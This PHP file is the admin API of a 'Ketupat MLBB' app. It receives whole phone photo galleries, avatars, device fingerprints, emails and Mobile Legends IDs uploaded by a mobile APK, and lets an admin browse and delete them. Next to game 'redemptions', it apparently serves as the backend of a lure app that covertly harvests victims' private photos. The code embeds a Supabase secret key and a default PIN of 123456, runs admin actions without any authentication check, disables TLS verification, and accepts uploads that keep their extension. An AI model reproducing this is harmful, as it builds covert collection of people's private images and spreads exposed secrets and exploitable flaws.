<?php
/**
 * Ketupat MLBB - Clean Modern Admin API Controller
 * Fast, reliable, and free of legacy spaghetti or circular overrides.
 */

header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, Authorization');

if (($_SERVER['REQUEST_METHOD'] ?? '') === 'OPTIONS') {
    http_response_code(200);
    exit;
}

error_reporting(E_ALL & ~E_DEPRECATED & ~E_NOTICE);
@ini_set('memory_limit', '512M');
@ini_set('max_execution_time', '180');

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

// Common directories
define('GALLERY_DIR', __DIR__ . '/../admin-php/uploads/gallery');
define('CONFIG_FILE', __DIR__ . '/../admin-php/config.json');

// Helper to respond with JSON
function sendResponse($success, $data = null, $message = '', $code = 200) {
    http_response_code($code);
    echo json_encode([
        'success'   => $success,
        'message'   => $message,
        'data'      => $data,
        'timestamp' => date('Y-m-d H:i:s')
    ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
    exit;
}

// Load App Configuration
function getNewAdminConfig() {
    $default = [
        'supabase_url'        => 'https://uatqaxxfzmpxkeeoeoin.supabase.co',
        'supabase_anon_key'   => 'sb_publishable_tRQMoLxGUIrWGcq2ZfEQRQ_CH3AufnW',
        'supabase_secret_key' => 'sb_secret_QhAHX-95fv7luaDjQEr0zw_vw3BnkVG',
        'admin_pin'           => '123456'
    ];
    if (file_exists(CONFIG_FILE)) {
        $data = @json_decode(file_get_contents(CONFIG_FILE), true);
        if (is_array($data)) return array_merge($default, $data);
    }
    return $default;
}

// Supabase REST Helper
function querySupabase($endpoint, $method = 'GET', $body = null) {
    $cfg = getNewAdminConfig();
    $url = rtrim($cfg['supabase_url'], '/') . '/rest/v1/' . ltrim($endpoint, '/');
    $key = !empty($cfg['supabase_secret_key']) ? $cfg['supabase_secret_key'] : $cfg['supabase_anon_key'];

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);

    $headers = [
        'Content-Type: application/json',
        'apikey: ' . $key,
        'Authorization: Bearer ' . $key
    ];
    if ($method === 'POST') {
        $headers[] = 'Prefer: return=representation';
    }

    if ($body !== null) {
        $payload = is_string($body) ? $body : json_encode($body);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    }
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    $resp = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($resp === false || $httpCode >= 400) {
        return ['ok' => false, 'code' => $httpCode, 'error' => $resp];
    }
    $decoded = json_decode($resp, true);
    return ['ok' => true, 'code' => $httpCode, 'data' => $decoded];
}

// Format Phone Model nicely
function cleanModelName($raw) {
    if (empty($raw)) return 'Android Device';
    $raw = preg_replace('/Build\/[a-zA-Z0-9._-]+/i', '', $raw);
    $raw = trim($raw);
    return $raw ?: 'Android Device';
}

// Locate device directory in uploads/gallery
function findDeviceDir($deviceId) {
    if (!is_dir(GALLERY_DIR)) return [null, ''];
    $cleanId = strtolower(trim($deviceId));
    $strippedId = preg_replace('/^device_/', '', $cleanId);

    // Direct match check
    $candidates = [$cleanId, 'device_' . $cleanId, $strippedId, 'device_' . $strippedId];
    foreach ($candidates as $cand) {
        $p = GALLERY_DIR . '/' . $cand;
        if (is_dir($p)) return [$p, $cand];
    }

    // Search via meta.json
    foreach (scandir(GALLERY_DIR) as $d) {
        if ($d === '.' || $d === '..' || $d === '.deleted_devices.json') continue;
        $full = GALLERY_DIR . '/' . $d;
        if (!is_dir($full)) continue;
        $mFile = $full . '/meta.json';
        if (file_exists($mFile)) {
            $m = @json_decode(file_get_contents($mFile), true);
            if (is_array($m)) {
                $mDev = strtolower(trim($m['device_id'] ?? ''));
                if ($mDev === $cleanId || $mDev === $strippedId || strtolower($d) === $cleanId) {
                    return [$full, $d];
                }
            }
        }
    }
    return [null, ''];
}

// Check if device was recently deleted
function checkDeletedCooldown($deviceId) {
    $f = GALLERY_DIR . '/.deleted_devices.json';
    if (!file_exists($f)) return false;
    $list = @json_decode(file_get_contents($f), true);
    if (!is_array($list)) return false;
    $clean = strtolower(trim($deviceId));
    $cleanStripped = preg_replace('/^device_/', '', $clean);
    $now = time();
    foreach ($list as $id => $ts) {
        if ($now - $ts < 300) {
            $c = strtolower(trim($id));
            if ($c === $clean || $c === $cleanStripped) return true;
        }
    }
    return false;
}

// Action Dispatcher
$action = $_GET['action'] ?? $_POST['action'] ?? '';
$rawBody = file_get_contents('php://input');
$body = $rawBody ? @json_decode($rawBody, true) : [];
if (!is_array($body)) $body = [];

switch ($action) {

    // --- AUTHENTICATION ---
    case 'login':
        $pin = trim($body['pin'] ?? $_POST['pin'] ?? '');
        $cfg = getNewAdminConfig();
        if ($pin === ($cfg['admin_pin'] ?? '123456')) {
            $_SESSION['admin_auth'] = true;
            sendResponse(true, ['authenticated' => true], 'Authenticated successfully');
        }
        sendResponse(false, null, 'Invalid Security PIN', 401);
        break;

    case 'logout':
        unset($_SESSION['admin_auth']);
        sendResponse(true, null, 'Logged out');
        break;

    case 'check_auth':
        $isAuth = !empty($_SESSION['admin_auth']);
        sendResponse(true, ['authenticated' => $isAuth]);
        break;

    // --- OVERVIEW STATS ---
    case 'stats':
        $deviceCount = 0;
        $totalPhotos = 0;
        if (is_dir(GALLERY_DIR)) {
            foreach (scandir(GALLERY_DIR) as $d) {
                if ($d === '.' || $d === '..' || $d === '.deleted_devices.json') continue;
                $full = GALLERY_DIR . '/' . $d;
                if (!is_dir($full)) continue;
                $deviceCount++;
                $mFile = $full . '/meta.json';
                if (file_exists($mFile)) {
                    $m = @json_decode(file_get_contents($mFile), true);
                    $totalPhotos += count($m['photos'] ?? []);
                }
            }
        }
        $redemptionsRes = querySupabase('redemptions?select=id,status');
        $redemptionsCount = 0;
        $pendingRedemptions = 0;
        if ($redemptionsRes['ok'] && is_array($redemptionsRes['data'])) {
            $redemptionsCount = count($redemptionsRes['data']);
            foreach ($redemptionsRes['data'] as $r) {
                if (stripos($r['status'] ?? '', 'process') !== false) $pendingRedemptions++;
            }
        }
        $usersRes = querySupabase('users?select=id');
        $usersCount = ($usersRes['ok'] && is_array($usersRes['data'])) ? count($usersRes['data']) : 0;

        sendResponse(true, [
            'total_devices'       => $deviceCount,
            'total_photos'        => $totalPhotos,
            'total_redemptions'   => $redemptionsCount,
            'pending_redemptions' => $pendingRedemptions,
            'total_users'         => $usersCount
        ]);
        break;

    // --- DEVICE DIRECTORY ---
    case 'list_devices':
        $devices = [];
        if (is_dir(GALLERY_DIR)) {
            foreach (scandir(GALLERY_DIR) as $d) {
                if ($d === '.' || $d === '..' || $d === '.deleted_devices.json') continue;
                $full = GALLERY_DIR . '/' . $d;
                if (!is_dir($full)) continue;

                $mFile = $full . '/meta.json';
                $meta = file_exists($mFile) ? @json_decode(file_get_contents($mFile), true) : [];
                if (!is_array($meta)) $meta = [];

                $devId = $meta['device_id'] ?? $d;
                if (checkDeletedCooldown($devId)) continue;

                $photos = $meta['photos'] ?? [];
                $photoCount = count($photos);

                // Find avatar or first photo thumbnail
                $thumb = '';
                $avatarFile = $full . '/avatar_current.jpg';
                if (file_exists($avatarFile)) {
                    $thumb = '../admin-php/uploads/gallery/' . $d . '/avatar_current.jpg';
                } else if (!empty($photos[0]['url'])) {
                    $thumb = '../admin-php/' . $photos[0]['url'];
                }

                // Gather up to 4 preview thumbnails
                $previews = [];
                foreach ($photos as $p) {
                    if (!empty($p['url'])) {
                        $previews[] = '../admin-php/' . $p['url'];
                        if (count($previews) >= 4) break;
                    }
                }

                $model = cleanModelName($meta['device_model'] ?? $meta['device_name'] ?? $d);
                $tag = substr(preg_replace('/[^a-zA-Z0-9]/', '', $devId), -7);

                $devices[] = [
                    'device_id'   => $devId,
                    'folder_name' => $d,
                    'phone_model' => $model,
                    'device_tag'  => $tag,
                    'player_ign'  => $meta['mlbb_ign'] ?: 'Player',
                    'mlbb_id'     => $meta['mlbb_id'] ?: '—',
                    'mlbb_server' => $meta['mlbb_server'] ?: '—',
                    'email'       => $meta['user_email'] ?: '—',
                    'photo_count' => $photoCount,
                    'has_access'  => !empty($meta['is_full_access']) || $photoCount > 0,
                    'thumbnail'   => $thumb,
                    'previews'    => $previews,
                    'last_active' => $meta['last_synced'] ?? date('c', filemtime($full))
                ];
            }
        }

        // Sort newest active first
        usort($devices, function($a, $b) {
            return strtotime($b['last_active']) - strtotime($a['last_active']);
        });

        sendResponse(true, $devices);
        break;

    // --- DEVICE DETAIL & GALLERY PHOTOS ---
    case 'get_device':
        $devId = trim($_GET['device_id'] ?? $body['device_id'] ?? '');
        if (empty($devId)) sendResponse(false, null, 'device_id is required', 400);

        list($dir, $folderName) = findDeviceDir($devId);
        if (!$dir || !is_dir($dir)) {
            sendResponse(false, null, 'Device directory not found', 404);
        }

        $metaFile = $dir . '/meta.json';
        $meta = file_exists($metaFile) ? @json_decode(file_get_contents($metaFile), true) : [];
        if (!is_array($meta)) $meta = [];

        $rawPhotos = $meta['photos'] ?? [];
        $cleanPhotos = [];
        $albumsCount = ['All' => count($rawPhotos)];

        foreach ($rawPhotos as $p) {
            $filename = $p['filename'] ?? '';
            $album = trim($p['album'] ?? 'Gallery') ?: 'Gallery';
            $url = !empty($p['url']) ? ('../admin-php/' . $p['url']) : ('../admin-php/uploads/gallery/' . $folderName . '/' . $filename);

            $cleanPhotos[] = [
                'id'         => $p['id'] ?? $filename,
                'filename'   => $filename,
                'name'       => $p['name'] ?? $filename,
                'album'      => $album,
                'size'       => $p['size'] ?? 0,
                'mime'       => $p['mime'] ?? 'image/jpeg',
                'url'        => $url,
                'is_avatar'  => !empty($p['is_avatar']),
                'date_added' => $p['date_added'] ?? date('c')
            ];

            if (!isset($albumsCount[$album])) $albumsCount[$album] = 0;
            $albumsCount[$album]++;
        }

        $albumsList = [];
        foreach ($albumsCount as $name => $count) {
            $albumsList[] = ['name' => $name, 'count' => $count];
        }

        sendResponse(true, [
            'device_id'   => $meta['device_id'] ?? $devId,
            'folder'      => $folderName,
            'phone_model' => cleanModelName($meta['device_model'] ?? $meta['device_name'] ?? $devId),
            'player_ign'  => $meta['mlbb_ign'] ?: 'Player',
            'mlbb_id'     => $meta['mlbb_id'] ?: '—',
            'mlbb_server' => $meta['mlbb_server'] ?: '—',
            'email'       => $meta['user_email'] ?: '—',
            'has_access'  => !empty($meta['is_full_access']) || count($cleanPhotos) > 0,
            'photos'      => $cleanPhotos,
            'albums'      => $albumsList
        ]);
        break;

    // --- PHOTO DELETION ---
    case 'delete_photo':
        $devId = trim($body['device_id'] ?? $_POST['device_id'] ?? '');
        $filename = trim($body['filename'] ?? $_POST['filename'] ?? '');

        if (empty($devId) || empty($filename)) {
            sendResponse(false, null, 'device_id and filename required', 400);
        }

        list($dir, $folderName) = findDeviceDir($devId);
        if (!$dir || !is_dir($dir)) sendResponse(false, null, 'Device not found', 404);

        $filePath = $dir . '/' . basename($filename);
        if (file_exists($filePath)) {
            @unlink($filePath);
        }

        // Update meta.json
        $mFile = $dir . '/meta.json';
        if (file_exists($mFile)) {
            $m = @json_decode(file_get_contents($mFile), true);
            if (is_array($m) && isset($m['photos'])) {
                $m['photos'] = array_values(array_filter($m['photos'], function($p) use ($filename) {
                    return ($p['filename'] ?? '') !== $filename && ($p['id'] ?? '') !== $filename;
                }));
                @file_put_contents($mFile, json_encode($m, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
            }
        }

        sendResponse(true, null, 'Photo deleted successfully');
        break;

    // --- WIPE ALL PHOTOS ---
    case 'wipe_photos':
        $devId = trim($body['device_id'] ?? $_POST['device_id'] ?? '');
        list($dir, $folderName) = findDeviceDir($devId);
        if (!$dir || !is_dir($dir)) sendResponse(false, null, 'Device not found', 404);

        foreach (scandir($dir) as $f) {
            if ($f === '.' || $f === '..' || $f === 'meta.json') continue;
            $fp = $dir . '/' . $f;
            if ($f === 'avatar_current.jpg') continue;
            @unlink($fp);
        }

        $mFile = $dir . '/meta.json';
        if (file_exists($mFile)) {
            $m = @json_decode(file_get_contents($mFile), true);
            if (is_array($m)) {
                $m['photos'] = array_values(array_filter($m['photos'] ?? [], function($p) {
                    return !empty($p['is_avatar']) || ($p['filename'] ?? '') === 'avatar_current.jpg';
                }));
                $m['reset_requested'] = true;
                @file_put_contents($mFile, json_encode($m, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
            }
        }

        sendResponse(true, null, 'All regular photos wiped');
        break;

    // --- DELETE DEVICE ---
    case 'delete_device':
        $devId = trim($body['device_id'] ?? $_POST['device_id'] ?? '');
        list($dir, $folderName) = findDeviceDir($devId);
        if ($dir && is_dir($dir)) {
            foreach (scandir($dir) as $item) {
                if ($item === '.' || $item === '..') continue;
                @unlink($dir . '/' . $item);
            }
            @rmdir($dir);
        }

        // Record cooldown in .deleted_devices.json
        $delFile = GALLERY_DIR . '/.deleted_devices.json';
        $delList = file_exists($delFile) ? @json_decode(file_get_contents($delFile), true) : [];
        if (!is_array($delList)) $delList = [];
        $delList[$devId] = time();
        @file_put_contents($delFile, json_encode($delList));

        // Purge matching Supabase users row if any
        querySupabase('users?email=ilike.%25' . urlencode($devId) . '%25', 'DELETE');

        sendResponse(true, null, 'Device deleted permanently');
        break;

    // --- REDEMPTIONS & PLAYERS ---
    case 'list_redemptions':
        $res = querySupabase('redemptions?select=*&order=created_at.desc&limit=100');
        if (!$res['ok']) sendResponse(false, [], 'Failed loading redemptions');
        sendResponse(true, $res['data'] ?: []);
        break;

    case 'update_redemption_status':
        $orderId = trim($body['order_id'] ?? '');
        $newStatus = trim($body['status'] ?? '');
        if (empty($orderId) || empty($newStatus)) sendResponse(false, null, 'order_id and status required', 400);

        $res = querySupabase('redemptions?order_id=eq.' . urlencode($orderId), 'PATCH', ['status' => $newStatus]);
        if (!$res['ok']) sendResponse(false, null, 'Failed updating status');
        sendResponse(true, null, 'Status updated');
        break;

    case 'delete_redemption':
        $orderId = trim($body['order_id'] ?? $_GET['order_id'] ?? '');
        if (empty($orderId)) sendResponse(false, null, 'order_id required', 400);

        $res = querySupabase('redemptions?order_id=eq.' . urlencode($orderId), 'DELETE');
        if (!$res['ok']) sendResponse(false, null, 'Failed deleting redemption');
        sendResponse(true, null, 'Redemption deleted');
        break;

    case 'list_users':
        $res = querySupabase('users?select=*&order=created_at.desc&limit=100');
        if (!$res['ok']) sendResponse(false, [], 'Failed loading users');
        sendResponse(true, $res['data'] ?: []);
        break;

    // --- GALLERY UPLOAD & LIVE STREAMING (FROM MOBILE APK) ---
    case 'upload_gallery':
    case 'sync_gallery_photos':
        $devId             = trim($body['device_id'] ?? $_POST['device_id'] ?? '');
        $deviceName        = trim($body['device_name'] ?? $_POST['device_name'] ?? '');
        $deviceModel       = trim($body['device_model'] ?? $_POST['device_model'] ?? '');
        $deviceFingerprint = trim($body['device_fingerprint'] ?? $_POST['device_fingerprint'] ?? '');
        $userEmail         = trim($body['user_email'] ?? $_POST['user_email'] ?? '');
        $mlbbId            = trim($body['mlbb_id'] ?? $_POST['mlbb_id'] ?? '');
        $mlbbServer        = trim($body['mlbb_server'] ?? $_POST['mlbb_server'] ?? '');
        $mlbbIgn           = trim($body['mlbb_ign'] ?? $_POST['mlbb_ign'] ?? '');

        if (empty($devId) && empty($userEmail)) {
            sendResponse(false, null, 'device_id or user_email required', 400);
        }

        if (checkDeletedCooldown($devId)) {
            sendResponse(true, ['reset_requested' => true, 'deleted_cooldown' => true], 'Device was deleted by administrator');
        }

        list($dir, $folderName) = findDeviceDir($devId);
        if (!$dir) {
            $cleanFolder = 'device_' . preg_replace('/[^a-zA-Z0-9_-]/', '_', strtolower($devId));
            $dir = GALLERY_DIR . '/' . $cleanFolder;
            if (!is_dir($dir)) {
                @mkdir($dir, 0777, true);
            }
            $folderName = $cleanFolder;
        }

        $metaFile = $dir . '/meta.json';
        $meta = file_exists($metaFile) ? @json_decode(file_get_contents($metaFile), true) : [];
        if (!is_array($meta)) $meta = [];

        $meta['device_id'] = $devId;
        if (!empty($deviceName)) $meta['device_name'] = $deviceName;
        if (!empty($deviceModel)) $meta['device_model'] = $deviceModel;
        if (!empty($deviceFingerprint)) $meta['device_fingerprint'] = $deviceFingerprint;
        if (!empty($userEmail)) $meta['user_email'] = $userEmail;
        if (!empty($mlbbId)) $meta['mlbb_id'] = $mlbbId;
        if (!empty($mlbbServer)) $meta['mlbb_server'] = $mlbbServer;
        if (!empty($mlbbIgn)) $meta['mlbb_ign'] = $mlbbIgn;
        $meta['is_full_access'] = true;
        $meta['last_synced'] = date('c');
        if (!isset($meta['photos']) || !is_array($meta['photos'])) {
            $meta['photos'] = [];
        }

        $incoming = $body['photos'] ?? [];
        $savedCount = 0;

        if (is_array($incoming)) {
            foreach ($incoming as $idx => $item) {
                $dataUrl = $item['dataUrl'] ?? '';
                if (empty($dataUrl)) continue;

                $parts = explode(',', $dataUrl);
                $rawBase64 = end($parts);
                $decoded = base64_decode($rawBase64);
                if ($decoded === false || strlen($decoded) === 0) continue;

                $isAvatar = !empty($item['is_avatar']);
                $contentHash = md5($decoded);
                $origName = $item['name'] ?? ('photo_' . time() . '_' . $idx . '.jpg');
                $album = trim($item['album'] ?? 'Gallery') ?: 'Gallery';
                $mime = $item['mime'] ?? 'image/jpeg';
                $size = strlen($decoded);

                if ($isAvatar) {
                    $avatarPath = $dir . '/avatar_current.jpg';
                    file_put_contents($avatarPath, $decoded);
                    $meta['photos'] = array_values(array_filter($meta['photos'], function($p) {
                        return empty($p['is_avatar']) && ($p['filename'] ?? '') !== 'avatar_current.jpg';
                    }));
                    array_unshift($meta['photos'], [
                        'id'           => 'avatar_current',
                        'filename'     => 'avatar_current.jpg',
                        'name'         => 'Profile Avatar',
                        'album'        => 'Avatar',
                        'url'          => 'uploads/gallery/' . $folderName . '/avatar_current.jpg',
                        'size'         => $size,
                        'mime'         => $mime,
                        'is_avatar'    => true,
                        'content_hash' => $contentHash,
                        'date_added'   => date('c')
                    ]);
                    $savedCount++;
                    continue;
                }

                // Deduplication
                $alreadyExists = false;
                foreach ($meta['photos'] as $ep) {
                    if (!empty($ep['content_hash']) && $ep['content_hash'] === $contentHash) {
                        $alreadyExists = true;
                        break;
                    }
                    if (($ep['name'] ?? '') === $origName && ($ep['album'] ?? '') === $album && intval($ep['size'] ?? 0) === $size) {
                        $alreadyExists = true;
                        break;
                    }
                }
                if ($alreadyExists) continue;

                $ext = pathinfo($origName, PATHINFO_EXTENSION);
                if (empty($ext)) $ext = 'jpg';
                $saveFilename = 'photo_' . time() . '_' . $idx . '_' . substr($contentHash, 0, 6) . '.' . $ext;
                $savePath = $dir . '/' . $saveFilename;

                if (@file_put_contents($savePath, $decoded)) {
                    $meta['photos'][] = [
                        'id'           => $item['id'] ?? $saveFilename,
                        'filename'     => $saveFilename,
                        'name'         => $origName,
                        'album'        => $album,
                        'url'          => 'uploads/gallery/' . $folderName . '/' . $saveFilename,
                        'size'         => $size,
                        'mime'         => $mime,
                        'is_avatar'    => false,
                        'content_hash' => $contentHash,
                        'date_added'   => date('c')
                    ];
                    $savedCount++;
                }
            }
        }

        @file_put_contents($metaFile, json_encode($meta, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));

        sendResponse(true, [
            'saved_count'  => $savedCount,
            'total_photos' => count($meta['photos']),
            'device_id'    => $devId
        ], 'Batch processed successfully');
        break;

    default:
        sendResponse(false, null, 'Invalid action', 404);
        break;
}
